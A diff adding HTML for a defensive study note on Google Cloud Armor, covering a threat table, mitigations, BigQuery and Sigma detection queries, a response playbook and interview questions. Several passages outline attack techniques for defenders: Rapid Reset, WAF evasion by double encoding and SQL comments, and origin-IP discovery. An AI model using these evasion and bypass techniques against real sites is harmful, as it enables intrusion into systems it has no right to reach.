+<td>High</td>
+</tr>
+<tr>
+<td>12</td>
+<td>Scraping / content theft</td>
+<td>T1595 Active Scanning</td>
+<td>Bots rotate IP/UA; no bot management</td>
+<td>IP loss, load, skewed analytics</td>
+<td>High</td>
+</tr>
+<tr>
+<td>13</td>
+<td>False positives blocking real users</td>
+<td>Detection gap / availability</td>
+<td>Sensitivity too high, untuned preconfigured rules</td>
+<td>Self-inflicted outage, revenue loss</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>14</td>
+<td>Direct-to-origin bypass</td>
+<td>Architecture gap</td>
+<td>Backend VM/bucket reachable by public IP, skipping LB</td>
+<td>WAF entirely bypassed</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>15</td>
+<td>Slowloris / slow-read</td>
+<td>T1499.002</td>
+<td>Long-lived low-rate connections hold resources</td>
+<td>Connection exhaustion</td>
+<td>Low (edge buffers)</td>
+</tr>
+<tr>
+<td>16</td>
+<td>Cache-busting flood on CDN</td>
+<td>T1498</td>
+<td>Random query strings force origin fetch</td>
+<td>Cache miss storm, origin overload</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>17</td>
+<td>reCAPTCHA / token replay</td>
+<td>T1528 / abuse</td>
+<td>Reusing or farming challenge tokens</td>
+<td>Bot bypass of challenge</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>18</td>
+<td>Adaptive Protection blind spot</td>
+<td>Detection gap</td>
+<td>Slow-ramp low-and-slow attack under ML baseline</td>
+<td>Undetected degradation</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>19</td>
+<td>Logging disabled / sampled</td>
+<td>Detection gap</td>
+<td><code>log-level</code> not VERBOSE; no export to SIEM</td>
+<td>No forensics, missed detection</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>20</td>
+<td>Regional GXLB / no global edge</td>
+<td>Architecture gap</td>
+<td>Using regional LB without global GFE absorption</td>
+<td>Reduced DDoS headroom</td>
+<td>Low</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="5-mitigation-controls">5. Mitigation Controls</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Threat (from §4)</th>
+<th>Concrete control</th>
+<th>Where applied</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>L3/L4 flood</td>
+<td>Always-on Google edge absorption (Standard tier, automatic)</td>
+<td>GFE / global edge</td>
+</tr>
+<tr>
+<td>2</td>
+<td>L7 flood</td>
+<td>Rate-based ban + Adaptive Protection ML</td>
+<td>Backend security policy</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Rapid Reset</td>
+<td>GFE stream-reset heuristics (Google-managed) + <code>enable-layer7-ddos-defense</code></td>
+<td>Edge / policy</td>
+</tr>
+<tr>
+<td>4</td>
+<td>SQLi</td>
+<td><code>evaluatePreconfiguredWaf('sqli-v33-stable')</code> deny-403</td>
+<td>Backend policy rule</td>
+</tr>
+<tr>
+<td>5</td>
+<td>XSS</td>
+<td><code>evaluatePreconfiguredWaf('xss-v33-stable')</code> deny-403</td>
+<td>Backend policy rule</td>
+</tr>
+<tr>
+<td>6</td>
+<td>LFI/RFI/traversal</td>
+<td><code>lfi-v33</code> / <code>rfi-v33</code> / <code>protocolattack-v33</code> rules</td>
+<td>Backend policy rule</td>
+</tr>
+<tr>
+<td>7</td>
+<td>RCE (Log4Shell)</td>
+<td>Custom CEL match + <code>cve-canary</code> + <code>rce-v33</code>, virtual patch</td>
+<td>Backend policy rule</td>
+</tr>
+<tr>
+<td>8</td>
+<td>WAF evasion</td>
+<td>Higher <code>sensitivity</code>, body inspection, normalization; layered origin validation</td>
+<td>Policy + backend</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Rule-order error</td>
+<td>Policy-as-code review, deterministic priority scheme, preview mode</td>
+<td>CI/CD + policy</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Spoofed XFF</td>
+<td><code>enforce_on_key = XFF_IP</code> only behind trusted proxy; else use <code>IP</code></td>
+<td>Rate-limit config</td>
+</tr>
+<tr>
+<td>11</td>
+<td>Credential stuffing</td>
+<td>Multi-key rate limits (IP + header/cookie) + reCAPTCHA redirect</td>
+<td>Policy rule</td>
+</tr>
+<tr>
+<td>12</td>
+<td>Scraping</td>
+<td>reCAPTCHA Enterprise bot scoring + rate-based ban</td>
+<td>Policy + reCAPTCHA</td>
+</tr>
+<tr>
+<td>13</td>
+<td>False positives</td>
+<td><code>preview</code> mode, per-subsig <code>opt_out_rule_ids</code>, staged sensitivity</td>
+<td>Policy tuning</td>
+</tr>
+<tr>
+<td>14</td>
+<td>Direct-to-origin</td>
+<td>VPC firewall allow only Google LB ranges; private backends; no public IP</td>
+<td>VPC firewall / LB</td>
+</tr>
+<tr>
+<td>15</td>
+<td>Slowloris</td>
+<td>GFE connection buffering + backend timeouts</td>
+<td>Edge + backend</td>
+</tr>
+<tr>
+<td>16</td>
+<td>Cache-busting</td>
+<td>Cache-key normalization; rate-limit high-cardinality query paths</td>
+<td>Cloud CDN + policy</td>
+</tr>
+<tr>
+<td>17</td>
+<td>Token replay</td>
+<td>reCAPTCHA Enterprise action-tokens with short TTL</td>
+<td>reCAPTCHA integration</td>
+</tr>
+<tr>
+<td>18</td>
+<td>Slow-ramp DDoS</td>
+<td>Adaptive Protection + manual thresholds + anomaly alerting</td>
+<td>Policy + SIEM</td>
+</tr>
+<tr>
+<td>19</td>
+<td>Logging gaps</td>
+<td><code>--log-level VERBOSE</code>, export request logs to BigQuery/SIEM</td>
+<td>Logging config</td>
+</tr>
+<tr>
+<td>20</td>
+<td>Regional-only edge</td>
+<td>Use Global External Application LB for global GFE absorption</td>
+<td>Architecture</td>
+</tr>
+</tbody>
+</table>
+<h3 id="top-5-in-depth">Top 5 in depth</h3>
+<p><strong>1. Preconfigured WAF rules (OWASP CRS) with disciplined tuning.</strong> Cloud Armor wraps the <strong>OWASP ModSecurity Core Rule Set 3.3</strong> into named evaluators (<code>sqli-v33-stable</code>, <code>xss-v33-stable</code>, <code>lfi-v33</code>, <code>rce-v33</code>, <code>rfi-v33</code>, <code>protocolattack-v33</code>, <code>scannerdetection-v33</code>, <code>sessionfixation-v33</code>). Each is invoked in a CEL expression and returns true when the request matches any of its subsignatures. The critical knob is <strong><code>sensitivity</code> (0–4)</strong>, mapping to CRS paranoia levels: level 1 is a curated low-false-positive set; each level up adds broader (noisier) rules. Technically each subsignature has an ID like <code>owasp-crs-v030301-id942100-sqli</code>, and you can surgically disable a noisy one with <code>opt_out_rule_ids</code> or force-enable a stricter one with <code>opt_in_rule_ids</code>. <strong>How I deploy it:</strong> start every preconfigured rule at <code>sensitivity: 1</code> in <strong>preview mode</strong>, feed request logs to BigQuery for a week, count matches per subsignature against known-good traffic, opt out the false-positive generators, then flip off preview. <strong>Trade-off:</strong> these are signature/heuristic rules, not semantic parsers — they can be evaded with novel encodings and can false-positive on legitimate payloads (e.g., a blog CMS where users legitimately post SQL snippets). The WAF is a compensating control, <strong>never</strong> a substitute for parameterized queries and output encoding at the origin (see the SQLi and XSS notes).</p>
+<p><strong>2. Rate-based ban and throttle.</strong> This is the workhorse against L7 floods, credential stuffing, scraping, and enumeration. A <code>throttle</code> action enforces a steady rate and returns <code>429</code> to the overflow; <code>rate_based_ban</code> goes further — once a <strong>client key</strong> crosses <code>ban_threshold_count</code> in <code>ban_threshold_interval_sec</code>, that key is <strong>banned</strong> for <code>ban_duration_sec</code>, so you stop spending evaluation on it entirely. The client key is defined by <code>enforce_on_key</code>: <code>IP</code>, <code>XFF_IP</code> (only behind a trusted proxy — otherwise spoofable), <code>HTTP_HEADER</code> (e.g., an API key), <code>HTTP_COOKIE</code> (session), <code>HTTP_PATH</code>, <code>SNI</code>, <code>REGION_CODE</code>, or <code>ALL</code> (a single global counter for a coarse ceiling). <strong>Best practice:</strong> stack multiple rules — a per-IP ban to stop single-source abuse <em>and</em> a per-username (<code>HTTP_HEADER</code>/<code>HTTP_COOKIE</code>) ban to catch distributed credential stuffing that rotates IPs, mirroring the multi-dimensional strategy in the API-Security note. <strong>Trade-off:</strong> shared NAT/CGNAT means one IP can represent thousands of real users, so an IP ban can collateral-damage a corporate office or mobile carrier; tune thresholds against your traffic and prefer identity-based keys where you have them.</p>
+<p><strong>3. Adaptive Protection (ML L7 DDoS).</strong> Enabled with <code>--enable-layer7-ddos-defense</code>, Adaptive Protection builds a <strong>per-backend-service</strong> machine-learning baseline of normal L7 traffic (request rate, headers, methods, paths, geo, UA distributions). During an anomaly it computes an <strong>attack signature</strong> — the specific feature combination distinguishing attack from baseline — scores its confidence, raises an alert in Cloud Logging / Security Command Center, and <strong>suggests a concrete Cloud Armor rule</strong> (with the CEL expression) that isolates the attackers. You can review-and-apply or configure auto-deploy. This is what turned the 46 Mrps and 398 Mrps events into non-events: it detects and proposes in seconds, faster than any human. <strong>Trade-off:</strong> it needs a training window to baseline (cold start), it can be evaded by a slow ramp that shifts the baseline gradually (low-and-slow), and it is a <strong>Managed Protection Plus</strong> paid feature. Pair it with static rate-based rules so you're never wholly dependent on ML.</p>
+<p><strong>4. reCAPTCHA Enterprise bot management.</strong> Cloud Armor integrates with reCAPTCHA Enterprise at the edge using <strong>session tokens</strong> and <strong>action tokens</strong>: the client obtains a token, the token carries a fraud/bot <strong>score</strong> (0.0–1.0), and a Cloud Armor rule reads <code>token.recaptcha_session.score</code> to <code>allow</code>, <code>deny</code>, or <code>redirect</code> to a manual challenge — all evaluated at the GFE without a round-trip to your origin. This lets you gate only high-risk actions (checkout, login, account creation) rather than challenging everyone. <strong>Trade-off:</strong> tokens can be farmed by CAPTCHA-solving services, real users on privacy-hardened browsers score low and get friction, and it adds client-side integration work. Use score-based invisible assessment first, and reserve visible challenges for the lowest-scoring sessions.</p>
+<p><strong>5. Architecture: force all traffic through the LB (no direct-to-origin).</strong> A WAF is worthless if attackers can reach the backend directly. The control is <strong>network</strong>: give backends no public IP, and use <strong>VPC firewall rules</strong> that allow ingress only from Google's load-balancer health-check and proxy ranges (<code>35.191.0.0/16</code>, <code>130.211.0.0/22</code> for the classic health checkers), plus for GCS-backed origins keep buckets private and serve only through the LB. Additionally use a <strong>shared secret header</strong> injected by the LB and validated at the origin (a "did this really come through my edge?" check) to defeat origin-IP discovery. <strong>Trade-off:</strong> operational discipline — any new backend that gets a public IP or an over-broad firewall rule silently reopens the bypass, so this must be enforced by Organization Policy (<code>compute.vmExternalIpAccess</code> deny) and continuously audited, not just set once.</p>
+<hr />
+<h2 id="6-detection-response">6. Detection &amp; Response</h2>
+<h3 id="what-to-log-telemetry-sources">What to log / telemetry sources</h3>
+<ul>
+<li><strong>Cloud Armor request logs</strong> — emitted through the load balancer's <code>requests</code> log (<code>resource.type="http_load_balancer"</code>). Key fields under <code>jsonPayload.enforcedSecurityPolicy</code>: <code>name</code> (policy), <code>outcome</code> (<code>ACCEPT</code>/<code>DENY</code>), <code>priority</code> (matched rule), <code>configuredAction</code>, and — with <code>--log-level VERBOSE</code> — <code>preconfiguredExprIds</code> (the exact CRS subsignature IDs that matched). Also <code>jsonPayload.remoteIp</code>, <code>httpRequest.requestUrl</code>, <code>httpRequest.userAgent</code>, <code>httpRequest.status</code>.</li>
+<li><strong>Adaptive Protection alerts</strong> — <code>jsonPayload.adaptiveProtection.confidence</code> and suggested-rule detail; surfaced in Cloud Logging and <strong>Security Command Center</strong> as findings.</li>
+<li><strong>Rate-limit / ban telemetry</strong> — <code>enforcedSecurityPolicy.outcome = DENY</code> with the rate-based rule's priority; ban events show sustained denies from one key.</li>
+<li><strong>reCAPTCHA assessments</strong> — score distributions per action, token verdicts.</li>
+<li>Export all of the above to <strong>BigQuery</strong> (log sink) and/or <strong>Chronicle/SIEM</strong> for retention, correlation, and the queries below.</li>
+</ul>
+<h3 id="sample-detections">Sample detections</h3>
+<p><strong>SQL over a log sink exported to BigQuery — top blocked SQLi subsignatures and sources in the last hour:</strong></p>
+<pre><code class="language-sql">SELECT
+  jsonPayload.enforcedSecurityPolicy.name        AS policy,
+  jsonPayload.remoteIp                            AS src_ip,
+  httpRequest.requestUrl                          AS url,
+  subsig                                          AS matched_crs_rule,
+  COUNT(*)                                        AS hits
+FROM `corp-logs.armor.compute_googleapis_com_requests_*`,
+  UNNEST(jsonPayload.enforcedSecurityPolicy.preconfiguredExprIds) AS subsig
+WHERE _PARTITIONTIME &gt;= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 1 HOUR)
+  AND jsonPayload.enforcedSecurityPolicy.outcome = 'DENY'
+  AND subsig LIKE 'owasp-crs-%sqli%'
+GROUP BY policy, src_ip, url, matched_crs_rule
+ORDER BY hits DESC
+LIMIT 50;
+</code></pre>
+<p><strong>Detect a distributed L7 flood — many distinct IPs, high request rate, low block ratio (evasion getting through):</strong></p>
+<pre><code class="language-sql">SELECT
+  TIMESTAMP_TRUNC(timestamp, MINUTE)              AS minute,
+  COUNT(*)                                        AS total_reqs,
+  COUNT(DISTINCT jsonPayload.remoteIp)            AS distinct_ips,
+  COUNTIF(jsonPayload.enforcedSecurityPolicy.outcome = 'DENY') AS denied,
+  SAFE_DIVIDE(COUNTIF(httpRequest.status = 200), COUNT(*))     AS success_ratio
+FROM `corp-logs.armor.compute_googleapis_com_requests_*`
+WHERE _PARTITIONTIME &gt;= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 MINUTE)
+GROUP BY minute
+HAVING total_reqs &gt; 100000 AND distinct_ips &gt; 5000
+ORDER BY minute DESC;
+</code></pre>
+<p><strong>Sigma-style rule (portable to a SIEM) for credential-stuffing bursts:</strong></p>
+<pre><code class="language-yaml">title: Cloud Armor Credential Stuffing Burst on Login
+logsource:
+  product: gcp
+  service: cloud_armor
+detection:
+  selection:
+    httpRequest.requestUrl|contains: '/login'
+    jsonPayload.enforcedSecurityPolicy.outcome: 'DENY'
+    jsonPayload.enforcedSecurityPolicy.configuredAction: 'RATE_BASED_BAN'
+  timeframe: 5m
+  condition: selection | count() by jsonPayload.remoteIp &gt; 50
+level: high
+</code></pre>
+<h3 id="response-playbook">Response playbook</h3>
+<ol>
+<li><strong>Triage / confirm (detect).</strong> Open the LB monitoring dashboard and the BigQuery flood query; confirm whether it is a genuine attack vs a traffic spike or a self-inflicted false-positive wave. Check Adaptive Protection findings in Security Command Center for a ready-made signature and confidence score.</li>
+<li><strong>Contain — edge rules first.</strong> Deploy or accept the Adaptive Protection <strong>suggested rule</strong> at a low (high-precedence) priority. If manual, add a <code>deny-403</code>/<code>deny-429</code> rule matching the attack signature (geo, ASN, UA, path, header). For volumetric floods, rely on the always-on absorption and tighten <code>rate_based_ban</code> thresholds. Use <strong>preview mode</strong> only if you must validate against false positives; in an active incident, enforce.</li>
+<li><strong>Contain — protect origin.</strong> Verify no direct-to-origin path exists (firewall allows only LB ranges); if a bypass is found, shut the public path immediately and rotate the LB shared-secret header.</li>
+<li><strong>Eradicate.</strong> Narrow the mitigating rule to minimize collateral (move from broad geo-block to specific ASN/subsignature match as you learn the pattern). For an exploit attempt (SQLi/RCE), pair the WAF rule with an origin patch — the WAF is the stopgap, the code fix is the cure.</li>
+<li><strong>Recover.</strong> Once traffic normalizes, relax temporary broad blocks in stages, watching <code>success_ratio</code> and error rates so you don't re-open exposure or keep legitimate users locked out. Convert any effective emergency rule into reviewed policy-as-code.</li>
+<li><strong>Post-incident.</strong> Export the attack window from BigQuery; document peak Mrps/bps, source distribution, matched subsignatures, and time-to-mitigate. Feed learnings into rate thresholds and Adaptive Protection tuning; update runbooks.</li>
+</ol>
+<hr />
+<h2 id="7-practice-questions">7. Practice Questions</h2>
+<h3 id="tier-1-fundamentals">Tier 1 — Fundamentals</h3>
+<p><strong>Q1. What is Cloud Armor and where in the request path does it enforce?</strong><br />
+Cloud Armor is Google Cloud's edge WAF and DDoS-mitigation service. It attaches a <strong>security policy</strong> to a backend service of a Global External Load Balancer (or Cloud CDN / hybrid NEG), and enforcement happens at the <strong>Google Front End (GFE)</strong> at the network edge — before traffic reaches your backend. That placement means malicious requests are dropped without consuming backend compute, VPC egress, or autoscaling budget, and volumetric L3/L4 floods are absorbed by Google's global edge capacity.<br />
+<em>Signal:</em> Does the candidate know it's edge-enforced (not origin) and tied to the global LB?</p>
+<p><strong>Q2. How does rule evaluation order work in a security policy?</strong><br />
+Each rule has an integer <strong>priority</strong>; rules are evaluated in <strong>ascending</strong> order (lowest number first). Evaluation is <strong>first-match-wins</strong> — the first rule whose match condition is true applies its action and stops evaluation. A default rule at priority <code>2147483647</code> handles unmatched traffic. So you put specific allows/denies at low numbers and the catch-all at the top number; a broad allow placed at a low priority will shadow more specific denies below it.<br />
+<em>Signal:</em> Understands ordered, first-match semantics and the shadowing pitfall.</p>
+<p><strong>Q3. What are preconfigured WAF rules and what do they cover?</strong><br />
+They are Google-maintained rule sets wrapping the <strong>OWASP ModSecurity Core Rule Set 3.3</strong>, exposed as CEL evaluators like <code>evaluatePreconfiguredWaf('sqli-v33-stable', {...})</code>. They cover SQLi, XSS, LFI, RFI, RCE, protocol attacks, scanner detection, and session fixation. You tune them with a <code>sensitivity</code> level (0–4, mapping to CRS paranoia) and can opt individual subsignatures in or out by ID. They are heuristic/signature-based compensating controls, not a replacement for secure coding.<br />
+<em>Signal:</em> Knows CRS origin, the categories, and the sensitivity/tuning knobs.</p>
+<p><strong>Q4. Difference between <code>throttle</code> and <code>rate_based_ban</code>?</strong><br />
+<code>throttle</code> enforces a steady rate and returns <code>429</code> to overflow requests, but never blocks the client outright. <code>rate_based_ban</code> throttles <em>and</em>, once a client key crosses a ban threshold, <strong>bans</strong> that key for a configured duration so all its requests are dropped without further evaluation. Both let you pick the <strong>client key</strong> (<code>IP</code>, <code>XFF_IP</code>, <code>HTTP_HEADER</code>, <code>HTTP_COOKIE</code>, etc.). Use <code>rate_based_ban</code> for abusive floods/credential stuffing, <code>throttle</code> for smoothing legitimate bursty traffic.<br />
+<em>Signal:</em> Distinguishes rate-shaping from banning and knows client-key selection.</p>
+<p><strong>Q5. What DDoS protection do you get automatically vs. what you must configure?</strong><br />
+<strong>L3/L4 volumetric absorption is always-on and automatic</strong> (Standard tier, free) — SYN floods, UDP floods, amplification are soaked up at Google's edge. What you configure is the <strong>L7 layer</strong>: WAF rules, rate limiting, geo/IP allow-deny, bot management, and <strong>Adaptive Protection</strong> (ML L7 DDoS, a Managed Protection Plus feature). So volumetric defense is a given; application-layer defense is your responsibility to author.<br />
+<em>Signal:</em> Cleanly separates always-on L3/L4 from configurable L7.</p>
+<h3 id="tier-2-system-design-trade-offs">Tier 2 — System design / trade-offs</h3>
+<p><strong>Q6. Design edge protection for a global e-commerce site with login, search, and checkout.</strong><br />
+I'd front everything with a <strong>Global External Application Load Balancer</strong> and attach a Cloud Armor backend policy. Layer the rules by priority: (1) low-priority <strong>IP/geo allow-deny</strong> and address-group blocks for known-bad and sanctioned regions; (2) <strong>preconfigured WAF</strong> (SQLi/XSS/LFI/RCE at sensitivity 1, tuned via preview + BigQuery) as <code>deny-403</code>; (3) <strong>rate-based ban</strong> on <code>/login</code> keyed by both IP and a session/username header to defeat distributed credential stuffing; (4) <strong>reCAPTCHA Enterprise</strong> score-gating on <code>/checkout</code> and account creation, challenging only low-score sessions; (5) enable <strong>Adaptive Protection</strong> for ML L7 DDoS with alerting to SecOps. Architecturally, backends have no public IP and firewalls allow only LB ranges, with an LB-injected shared secret header validated at origin to kill direct-to-origin bypass. Everything is policy-as-code in Terraform with review, and I ship new rules in <strong>preview mode</strong> first. Logging is VERBOSE, exported to BigQuery and the SIEM.<br />
+<em>Signal:</em> Layered defense, key selection, false-positive discipline, anti-bypass architecture, observability.</p>
+<p><strong>Q7. How do you roll out a new WAF rule without breaking production?</strong><br />
+Use <strong>preview mode</strong> (<code>--preview</code>): the rule evaluates and logs what it <em>would</em> do (<code>previewSecurityPolicy</code> in logs) but doesn't enforce. Deploy at sensitivity 1, run for a representative window (a week including peak/business cycles), then query request logs in BigQuery for matches against known-good traffic, grouping by CRS subsignature ID. Opt out the subsignatures generating false positives, re-preview, and only then flip enforcement on. Roll out to a canary backend or a fraction of traffic first if possible. This staged approach prevents the classic self-inflicted outage where an over-sensitive WAF blocks legitimate users.<br />
+<em>Signal:</em> Knows preview mode, data-driven tuning, and the false-positive risk.</p>
+<p><strong>Q8. A shared corporate office behind one NAT IP keeps getting rate-limit-banned. What do you do?</strong><br />
+The problem is that <code>enforce_on_key = IP</code> treats thousands of NAT'd users as one client. Options, in order of preference: (1) switch the key to an <strong>identity dimension</strong> — a session cookie or authenticated user header (<code>HTTP_COOKIE</code>/<code>HTTP_HEADER</code>) — so limits are per-user, not per-egress-IP; (2) if the office is trusted, <strong>allowlist</strong> its range via an address group at a higher-precedence priority so it skips the rate rule; (3) if you must key on IP but the client is behind your own trusted proxy, use <code>XFF_IP</code> to get the real client IP (only when the XFF header is trustworthy, else it's spoofable). I'd also raise the threshold for known corporate ranges. The general lesson: IP-based limiting collateral-damages CGNAT/NAT, so prefer identity keys.<br />
+<em>Signal:</em> Understands NAT collateral damage and identity-vs-IP keying and XFF spoofing risk.</p>
+<p><strong>Q9. When would you use an edge security policy vs. a backend security policy?</strong><br />
+<strong>Backend policies</strong> (<code>CLOUD_ARMOR</code>) are the full WAF, evaluated after the LB selects a backend, with access to the complete CEL feature set including preconfigured WAF and rate limiting — this is where nearly all rules live. <strong>Edge policies</strong> (<code>CLOUD_ARMOR_EDGE</code>) are evaluated earlier, at the outermost edge, primarily to filter requests to <strong>Cloud CDN-cached content</strong> and do coarse IP/geo allow-deny <strong>before</strong> cache lookup — protecting even cache hits and cheaply. A request can be evaluated by both. Use edge policies to drop obviously unwanted traffic (geo blocks, known-bad IPs) as early and cheaply as possible, and backend policies for the rich WAF/rate-limit logic. Note edge policies have a narrower feature set (no rate limiting, no preconfigured WAF).<br />
+<em>Signal:</em> Knows the two policy types, their evaluation points, and CDN interaction.</p>
+<p><strong>Q10. Cloud Armor vs. AWS WAF+Shield vs. Azure Front Door WAF+DDoS — how do you translate?</strong><br />
+All three provide edge WAF + DDoS, but the packaging differs. <strong>AWS</strong> splits it: WAF (rule-based, attached to CloudFront/ALB/API-GW), <strong>Shield Standard</strong> (free, always-on L3/L4) and <strong>Shield Advanced</strong> (paid, adds L7 protections, DDoS Response Team, cost protection). <strong>Azure</strong> pairs <strong>Front Door / Application Gateway WAF</strong> (managed CRS rule sets) with <strong>Azure DDoS Protection</strong> (Network/IP tiers, always-on with the paid tier adding metrics, rapid response, cost protection). <strong>GCP</strong> bundles more into <strong>Cloud Armor</strong>: always-on L3/L4 (Standard, free) plus L7 WAF/rate-limit/Adaptive Protection (Managed Protection Plus). The concepts map — CRS-based managed rules, custom rules, rate limiting, ML DDoS detection, bill protection — but the tier/pricing boundaries and rule languages (CEL vs AWS's JSON statements vs Azure's custom rules) differ. See the AWS WAF/Shield and Azure DDoS notes for detail.<br />
+<em>Signal:</em> Cross-cloud fluency and awareness that the <em>boundaries</em> between free/paid and WAF/DDoS differ per provider.</p>
+<h3 id="tier-3-expert-deep-dive">Tier 3 — Expert / deep-dive</h3>
+<p><strong>Q11. Walk through the HTTP/2 Rapid Reset attack and why Cloud Armor absorbed 398 Mrps.</strong><br />
+HTTP/2 multiplexes streams over one TCP connection, bounded by <code>SETTINGS_MAX_CONCURRENT_STREAMS</code>. The Rapid Reset technique (CVE-2023-44487) opens a request stream and immediately sends <code>RST_STREAM</code> to cancel it; the cancellation frees the client's concurrency slot instantly while the server still incurs stream setup/teardown work, so one connection can drive a near-unbounded request rate — defeating the concurrency cap that was supposed to bound server work. Attackers reached 398 million req/s against Google in October 2023. Cloud Armor/GFE absorbed it for two reasons: (1) Google's edge has <strong>enormous distributed L7 capacity</strong> (the same fleet fronting Search/YouTube), and (2) the GFE implements <strong>heuristics that detect abnormal open-then-reset ratios per connection and throttle or close offending connections</strong>. The takeaway: at 398 Mrps, no origin-side rate limiter helps — mitigation must be at an edge with Mrps-scale headroom, plus a protocol-aware heuristic for the specific abuse.<br />
+<em>Signal:</em> Deep protocol understanding + why edge scale + heuristic is the answer.</p>
+<p><strong>Q12. How does Adaptive Protection actually detect and mitigate an L7 DDoS, and what are its blind spots?</strong><br />
+Adaptive Protection builds a <strong>per-backend-service</strong> ML baseline over L7 features — request rate, method/path/header distributions, geo, UA, and more. During an anomaly it identifies the <strong>attack signature</strong>: the minimal feature combination that separates attack traffic from the learned baseline (e.g., a specific UA + path + region cluster). It scores confidence, raises a Cloud Logging / Security Command Center alert, and <strong>generates a candidate Cloud Armor rule</strong> (the CEL expression) you can apply or auto-deploy. Blind spots: (1) <strong>cold start</strong> — it needs a baseline window, so a brand-new backend is under-protected initially; (2) <strong>low-and-slow</strong> attacks that ramp gradually can shift the baseline so the anomaly never trips; (3) it's <strong>per-backend</strong>, so a signal spread thin across many backends may not stand out; (4) it's a paid (<strong>Managed Protection Plus</strong>) feature. Mitigation: pair it with static rate-based rules and manual thresholds so ML is a force-multiplier, not a single point of failure.<br />
+<em>Signal:</em> Knows the ML mechanics, the suggested-rule loop, and the honest limitations.</p>
+<p><strong>Q13. An attacker is bypassing your SQLi preconfigured rule with double-URL-encoding and inline comments. How do you respond, and what's the deeper lesson?</strong><br />
+First, confirm via VERBOSE logs which requests are getting through (200s with SQLi-shaped payloads). Short-term: raise the SQLi rule <strong>sensitivity</strong> so more CRS subsignatures (including comment/encoding evasion checks) engage, and add a <strong>custom CEL rule</strong> matching the specific evasion pattern (e.g., repeated <code>%25</code> double-encoding or <code>/**/</code> comment sequences) as <code>deny-403</code> — a targeted virtual patch. Enable body inspection where the payload rides in POST data. But the deeper lesson is that a <strong>WAF is a heuristic pattern matcher, not a SQL parser</strong> — it will always be evadable with enough encoding creativity, so the durable fix is at the origin: <strong>parameterized queries / prepared statements</strong> and least-privilege DB accounts, which make injection structurally impossible regardless of what reaches the app (see the SQLi note). The WAF buys time; the code fix closes the hole.<br />
+<em>Signal:</em> Practical WAF tuning plus the maturity to say WAF is compensating, not curative.</p>
+<p><strong>Q14. How do you prevent attackers from bypassing Cloud Armor entirely by hitting the origin directly?</strong><br />
+The WAF only protects traffic that flows through the LB, so I must make the backend unreachable except via the LB. Concretely: (1) backends have <strong>no external IP</strong> (enforce with Org Policy <code>compute.vmExternalIpAccess</code> deny and <code>constraints/compute.restrictLoadBalancerCreationForTypes</code>); (2) <strong>VPC firewall</strong> ingress allows only Google's LB/health-check ranges (e.g., <code>35.191.0.0/16</code>, <code>130.211.0.0/22</code>) and denies the rest; (3) for GCS-backed origins, keep buckets <strong>private</strong> and serve only through the LB with signed access; (4) inject a <strong>secret custom header</strong> at the LB and validate it at the origin so even a leaked origin IP can't be abused without the secret; (5) continuously <strong>audit</strong> for drift — any new public IP or over-broad firewall rule reopens the bypass, so this is enforced by policy and monitored, not set-and-forget. Attackers routinely enumerate origin IPs via historical DNS, certificate transparency logs, and misconfigured subdomains, so assume the origin IP will leak and defend accordingly.<br />
+<em>Signal:</em> Thinks about the whole attack surface, not just the WAF; knows origin-discovery techniques.</p>
+<p><strong>Q15. Design a defense against a distributed credential-stuffing campaign that rotates across 50,000 residential-proxy IPs.</strong><br />
+Per-IP rate limiting is defeated by 50k rotating IPs — each IP looks low-volume — so I attack it on multiple axes. (1) <strong>Per-identity rate limiting</strong>: a <code>rate_based_ban</code> keyed by <code>HTTP_HEADER</code>/<code>HTTP_COOKIE</code> (username or session) catches the fact that a <em>single account</em> is being hammered from many IPs, and a per-username failure threshold triggers step-up. (2) <strong>reCAPTCHA Enterprise</strong> score-gating on <code>/login</code>: invisible assessment scores each session; low scores get a challenge or <code>deny</code>, and residential-proxy botnets typically score poorly and can't cheaply solve challenges at scale. (3) <strong>Adaptive Protection</strong> to catch the aggregate anomaly and suggest a signature (the campaign often shares a UA, TLS fingerprint, or path pattern). (4) <strong>Global</strong> counters (<code>enforce_on_key = ALL</code>) as a coarse ceiling on <code>/login</code> request rate. (5) Backend controls beyond Cloud Armor: <strong>breached-password checks</strong>, account lockout with exponential backoff, and mandatory <strong>MFA</strong> so a correct password alone isn't account takeover. Layering identity-keyed limits + bot scoring + ML + backend auth hardening turns an IP-rotation-immune attack into a detectable, contained one. This mirrors the multi-dimensional rate-limiting strategy in the API-Security note.<br />
+<em>Signal:</em> Recognizes IP-keying is insufficient, layers identity + bot + ML + backend auth, and connects to broader ATO defense.</p>
+<hr />
+<h2 id="8-provider-ecosystem-mapping">8. Provider / Ecosystem Mapping</h2>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>GCP Cloud Armor</th>
+<th>AWS</th>
+<th>Azure</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Edge WAF engine</td>
+<td>Cloud Armor security policies (CEL)</td>
+<td>AWS WAF (JSON rule statements) on CloudFront/ALB/API-GW</td>
+<td>Front Door WAF / App Gateway WAF</td>
+</tr>
+<tr>
+<td>Managed OWASP rules</td>
+<td>Preconfigured WAF (ModSecurity CRS 3.3)</td>
+<td>AWS Managed Rules (incl. CRS-based)</td>
+<td>Managed CRS rule sets (DRS)</td>
+</tr>
+<tr>
+<td>Custom rules language</td>
+<td>CEL expressions</td>
+<td>JSON statement DSL</td>
+<td>Custom rules (match conditions)</td>
+</tr>
+<tr>
+<td>Always-on L3/L4 DDoS</td>
+<td>Standard tier (free, automatic)</td>
+<td>Shield Standard (free)</td>
+<td>DDoS infra protection (platform)</td>
+</tr>
+<tr>
+<td>Advanced/paid DDoS</td>
+<td>Managed Protection Plus</td>
+<td>Shield Advanced</td>
+<td>DDoS Network / IP Protection tier</td>
+</tr>
+<tr>
+<td>ML L7 DDoS detection</td>
+<td>Adaptive Protection</td>
+<td>Shield Advanced automatic app-layer mitigation</td>
